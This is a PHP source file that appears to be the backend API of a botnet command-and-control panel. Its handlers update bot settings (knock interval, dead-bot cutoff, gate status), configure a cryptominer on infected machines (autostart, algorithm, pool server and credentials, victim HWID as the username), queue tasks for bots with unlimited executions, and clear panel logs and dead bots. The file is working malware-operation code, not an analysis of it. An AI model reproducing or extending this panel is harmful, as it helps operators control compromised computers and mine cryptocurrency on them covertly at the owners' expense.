<?php

function booltoint($input){
    if($input == true){
        return "1";
    }else{
        return "0";
    }
} 


switch ($_GET["edit"]) {
    case "settings":
        $settings = new Settings($db);
     
        $data = json_decode(json_encode($_POST,false),false);
        $settings->id = $data->id;
        $settings->knock = $data->knock;
        $settings->dead = $data->dead;
        $settings->gate_status = $data->gate_status;
        $settings->miner_autostart = $data->miner_autostart;
        $settings->miner_hwidAsUser = $data->miner_hwidAsUser;
        $settings->mining_algorithm = $data->mining_algorithm;
        $settings->mining_server = $data->mining_server;
        $settings->mining_username = $data->mining_username;
        $settings->mining_password = $data->mining_password;

       
        if($settings->update()){
            http_response_code(200);
            echo json_encode(array("message" => "Settings was updated."));
        }else{
            http_response_code(503);
            echo json_encode(array("message" => "Unable to update Settings."));
        }
    break;
    case "tasks":
        $data = json_decode(json_encode($_POST,false),false);
         $Tasks = new Tasks($db);

            // make sure data is not empty
            if(
                !empty($data->task) &&
                !empty($data->params) 
            ){
            
                // set product property values
                $Tasks->task = $data->task;
                $Tasks->params = $data->params;
                $Tasks->username = $username;
                if(empty($data->execs)){
                    $data->execs = "unlimited";
                }
                $Tasks->executions = $data->execs;
                if($Tasks->create()){
            
                    // set response code - 201 created
                    http_response_code(201);
            
                    // tell the user
                    echo json_encode(array("message" => "Product was created."));
                }
            
                // if unable to create the product, tell the user
                else{
            
                    // set response code - 503 service unavailable
                    http_response_code(503);
            
                    // tell the user
                    echo json_encode(array("message" => "Unable to create product."));
                }
            }
            
            // tell the user data is incomplete
            else{
                // set response code - 400 bad request
                http_response_code(400);
                // tell the user
                echo json_encode(array("message" => "Unable to create product. Data is incomplete."));
            }
    break;
    case "pause":
         $data = json_decode(json_encode($_POST,false),false);
         $Tasks = new Tasks($db);
            if(
                !empty($data->id) 
            ){
                $Tasks->id = $data->id;
                $Tasks->username = $username;
                if($Tasks->pause()){
                    http_response_code(201);
                    echo json_encode(array("message" => "Pause Success."));
                }
                else{
                    http_response_code(503);
                    echo json_encode(array("message" => "Unable to update Pause."));
                }
            }
            else{
                http_response_code(400);
                echo json_encode(array("message" => "Unknow Pause. Data is incomplete."));
            }
    break;
    case "resume":
        $data = json_decode(json_encode($_POST,false),false);
         $Tasks = new Tasks($db);
            if(
                !empty($data->id) 
            ){
                $Tasks->id = $data->id;
                $Tasks->username = $username;
                if($Tasks->resume()){
                    http_response_code(201);
                    echo json_encode(array("message" => "resume Success."));
                }
                else{
                    http_response_code(503);
                    echo json_encode(array("message" => "Unable to update resume."));
                }
            }
            else{
                http_response_code(400);
                echo json_encode(array("message" => "Unknow Resume. Data is incomplete."));
            }
    break;
    case "delete":
        $data = json_decode(json_encode($_POST,false),false);
         $Tasks = new Tasks($db);
            if(
                !empty($data->id) 
            ){
                $Tasks->id = $data->id;
                $Tasks->username = $username;
                if($Tasks->delete()){
                    http_response_code(201);
                    echo json_encode(array("message" => "Delete Success."));
                }
                else{
                    http_response_code(503);
                    echo json_encode(array("message" => "Unable to Delete Task."));
                }
            }
            else{
                http_response_code(400);
                echo json_encode(array("message" => "Unknow Delete. Data is incomplete."));
            }
    break;
    case "clearlogs":
    $data = json_decode(json_encode($_POST,false),false);
     $PanelLogs = new Plogs($db);
            if($PanelLogs->clear()){
                http_response_code(201);
                echo json_encode(array("message" => "Clear Success."));
            }
            else{
                http_response_code(503);
                echo json_encode(array("message" => "Unable to Clear Logs."));
            }
    break;
    case "cleardeadbots":
    $data = json_decode(json_encode($_POST,false),false);
     $Bots = new Bots($db);
            if($Bots->cleardeadbots()){
                http_response_code(201);
                echo json_encode(array("message" => "Clear Success."));
            }
            else{
                http_response_code(503);
                echo json_encode(array("message" => "Unable to Clear Logs."));
            }
    break;
}

